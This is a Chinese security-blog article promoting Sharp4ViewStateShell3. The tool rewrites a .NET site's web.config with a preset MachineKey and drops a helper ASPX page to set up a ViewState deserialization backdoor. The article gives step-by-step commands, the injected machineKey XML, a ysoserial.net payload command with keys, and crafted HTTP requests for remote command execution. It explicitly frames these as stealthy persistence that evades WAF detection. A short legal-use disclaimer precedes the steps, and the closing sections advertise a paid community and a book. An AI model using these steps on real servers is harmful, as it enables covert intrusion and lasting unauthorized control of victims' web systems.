#  .NET 基于 MachineKey 一键维持权限，通过 ViewState 反序列化工具实现RCE  
原创 专攻.NET安全的  dotNet安全矩阵   2025-06-18 01:53  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/NO8Q9ApS1YibJO9SDRBvE01T4A1oYJXlTBTMvb7KbAf7z9hY3VQUeayWI61XqQ0ricUQ8G1FykKHBNwCqpV792qg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
在红队渗透测试中，获取初始访问权限仅仅是开始，如何长期、隐蔽地维持权限才是真正的挑战。面对采用**.NET技术栈**  
的Web系统，传统的WebShell容易被安全设备检测，而基于**ViewState反序列化**  
的隐蔽后门技术，则成为红队维持权限的优选方案。  
  
**Sharp4ViewStateShell3**  
 是 Sharp4ViewStateShell 系列工具的最新增强版，通过**自动化修改MachineKey**  
、**动态释放辅助脚本**  
，并结合**ViewState反序列化漏洞**  
，实现无文件隐蔽的远程命令执行。相较于前代版本，支持**自定义站点路径**  
，使其在渗透中更具适应性和稳定性。  
  
**01. 工具基本介绍**  
  
  
  
相较于旧版工具，Sharp4ViewStateShell3 主要优化了以下功能，支持指定站点根目录  
，精准定位web.config  
，避免误操作。  
  
自动在同级目录释放**GenerateViewState.aspx**  
，确保请求路径可控。适配虚拟目录结构  
，使请求更符合正常业务流量，规避WAF检测。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YicBY5QtCNOPbsHFicvibgFQHwHea6dXHrAiazgWlJNhhLd3W50HF0iceWZN4vL3TBP8UvUTM1hROjN6Ug/640?wx_fmt=jpeg&from=appmsg "")  
  
**02. 工具实战用法**  
  
  
  
.NET 的 ViewState 功能本质是为了解决 Web 应用的无状态问题，保存控件状态信息。但如果目标应用开启了 EnableViewStateMac="true"  
 并使用弱或可控的 MachineKey，攻击者就可以伪造 ViewState，借助 ysoserial.net 工具构造反序列化链，从而实现命令执行RCE。  
本文内容和涉及的工具仅限安全研究目的，严禁用于非法渗透测试。使用者需遵守当地法律法规，未经授权测试造成的法律后果自行承担。  
## 2.1 一键修改配置文件  
  
修改目标  
假设目标站点的物理路径为：C:\  
inetpub\wwwroot\，  
在具有写入权限的目录，Upload  
下执行如下命令：  
  
```
C:\inetpub\wwwroot\Upload> Sharp4ViewStateShell3.exe "C:\inetpub\wwwroot"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicBY5QtCNOPbsHFicvibgFQHweJED4kdFyhAn395ibPbZ9IFdSCDKyJgQ9TkFhlU6vMbf7bRmqliazVicw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicBY5QtCNOPbsHFicvibgFQHwo531s4aIpLgvsaIB9CtYYzZNdLtPC38oewiauicQvz4I6xrhwkuLNyLw/640?wx_fmt=png&from=appmsg "")  
  
该命令会完成以下操作：修改**web.config**  
，插入预设的MachineKey：  
  
```
<machineKey  validationKey="B8D7C72D38E8972EA6B955F2D4C8D5B0A2E3F4C6A9B1D3E5F7A9C8B6D4E2F1"  decryptionKey="E4D5C6B3A8F9E7D6C5B4A3F2E1D0C9B8A7"  validation="SHA1"  decryption="AES"/>
```  
  
  
**在Upload目录下生成GenerateViewState.aspx**  
，用于获取__VIEWSTATEGENERATOR  
值。  
## 2.2 获取关键参数  
  
访问生成的页面，获取__VIEWSTATEGENERATOR  
：  
  
```
GET /Upload/GenerateViewState.aspx HTTP/1.1Host: target.com
```  
  
  
打开浏览器开发者工具，或使用 Burp 抓包查看响应内容，通常可获取：  
  
```
<input type="hidden" name="__VIEWSTATEGENERATOR"value="CA0B0334"/>
```  
  
## 2.3 生成恶意的ViewState  
  
使用 ysoserial.net 构造反序列化命令，生成后会输出一串 Base64 编码字符串，对应 ViewState 值。具体用法如下所示。  
  
```
ysoserial.exe -p ViewState -g XamlAssemblyLoadFromFile -c "./ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll" \--validationalg="SHA1" \--validationkey="28E969418EFBAF7DAF4A05B12A9F588774129BA306ED094A0C9CA70A45F6C4A83512EB9CF050D7261ADA8E57728B830E540BC26394CEF1F43AEC642AD61D894F" \--decryptionalg="AES" \--decryptionkey="F6F6CB3C4FE662991CEF709C5A2ACDDD228FDF21CD708186736FE4B3E008B3A6" \--generator="DBC4925F"
```  
  
  
该命令会输出Base64编码的__VIEWSTATE  
值，用于后续攻击  
## 2.4 发送恶意请求  
  
构造POST请求，将生成的ViewState数据发送至目标：  
  
```
POST /Upload/GenerateViewState.aspx HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedContent-Length:8921__VIEWSTATE=[恶意Payload]&__EVENTTARGET=&__EVENTARGUMENT=
```  
  
  
如一切配置正确，将在页面响应中看到命令结果，比如 tasklist  
。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibCwETGPtWyQJXCwHWxj47JzIR8aZZFYIQJl0N31k30dUJfcNuFBZl4NL4icTXuBJ4Q9jBVFQJtshA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp "")  
  
综上，  
Sharp4ViewStateShellPlus.exe  
 释放了一个GenerateViewState脚本，更加容易获取__VIEWSTATEGENERATOR 参数值，再加上  
利用了 .NET 的 ViewState 反序列化机制配合自定义 MachineKey，实现持久化远程命令执行，非常适合在红队渗透中用于权限维持。  
文章涉及的工  
具已  
打包在星球，感兴趣的朋友可以加入自取。  
  
**03.NET安全扩展学习**  
  
  
  
以上相关的知识点已收录于  
新书《.NET安全攻防指南》，全书共计25章，总计1010页，分为上下册，横跨.NET Web代码审计与红队渗透两大领域。  
  
  
**上册深入剖析.NET Web安全审计的核心技术，帮助读者掌握漏洞发现与修复的精髓；下册则聚焦于.NET逆向工程与攻防对抗的实战技巧，揭秘最新的对抗策略与技术方法。**  
  
  
**04. 技术精华内容**  
  
  
  
从漏洞分析到安全攻防，我们涵盖了 .NET 安全各个关键方面，为您呈现最新、最全面的 .NET 安全知识，下面是公众号发布的精华文章集合，推荐大伙阅读！  
  
[](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247499267&idx=2&sn=1462cf23c9a8568cc80705d2d3a1a69e&scene=21#wechat_redirect)  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247499837&idx=2&sn=a8a2483424b1932e7ec931be792744ba&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493952&idx=4&sn=db68011fb075c1d02268811163646b53&chksm=fa5947adcd2ecebbb1ca6659f289a5e344e37d1136fe0bd9272b5578e4c71bb19bb250e934d3&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247495167&idx=1&sn=9280c55fdc7c9146e549be470cf9f120&chksm=fa594312cd2eca04bfe8fd1fd3890b389d9c700b9b69d897f919addac399bab4f4d2e55f6b4f&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)  
  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)  
  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)  
  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)  
  
  
**05. 加入安全社区**  
  
  
  
目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最专业的技术知识库之一，超 **1200+**  
 成员一起互动学习。星球主题数量近 **600+**  
，精华主题   
230+  
，PDF文档和压缩包   
300+   
。从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的实战指南和最佳实践。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9AiaXibTRdEnEfYuQx76FjZVjmyEWtIaDuDePFFmyRqggiaq2k47pLoib9GZtUCOhaP40WPlhvbiaKZVg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
## 20+专栏文章  
  
星球文化始终认为授人以鱼不如授人以渔！星球整理出**20+**  
个专题栏目涵盖 **.NET安全 点、线、面、体等知识范围**  
，助力师傅们实战攻防！其中主题包括.NET  内网攻防、漏洞分析、内存马、代码审计、预编译、反序列化、WebShell免杀、命令执行、工具库等等。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopa90SJRuwnLy9uZV4icrXiaZlJPQlYJWXTw8HCrF9oTcE3DDgrdFnXo2BA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
## 海量资源和工具  
  
截至当前，dot.Net安全矩阵星球社区汇聚了   
**600+**  
 个实用工具和高质量PDF学习资料。这些资源涵盖了攻防对抗的各个方面，在实战中能够发挥显著作用，为对抗突破提供强有力的支持。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopaqVZW8XsALVA4FNiaj32q8npN82VSeqSKb4fQvLiczFNs0099VRFVQwPA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopa63ZXbX3YXLwoeNnjStcRtTbU9hoe6ecO5hhkj2apG1I6tKlkpz5GaQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
## 专属成员交流群  
  
我们还有多个成员专属的  
**内部星球陪伴群**  
，加入的成员可以通过在群里提出问题或参与论的方式来与其他成员交流思想和经验。此外还可以通过星球或者微信群私聊向我们进行提问，以获取帮助迅速解决问题。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopaAiaouHb6HYza539m9v0ykDoD2JezaArDZBPlJInuabf6XsduzVcjZ0Q/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
## 已入驻的大咖们  
  
星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多  
**高质量的.NET安全资源**  
，可以说市面上很少见，都是干货。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibEkb2HkMVuw4d7qjcTYUtl04w8xDiaUaJxticro644uWw5XuJ6ZXCNXCticjYWjpXNmp3omQHUNFRPg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
## 欢迎加入我们  
  
dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。  
**星球门票后期价格随着内容和质量的不断沉淀会适当提高，因此越早加入越好！**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopag09JtYcKpucjZPAlfeqC1ovcQvhrkemAzbURDaVF3InmpQshiatDnyQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
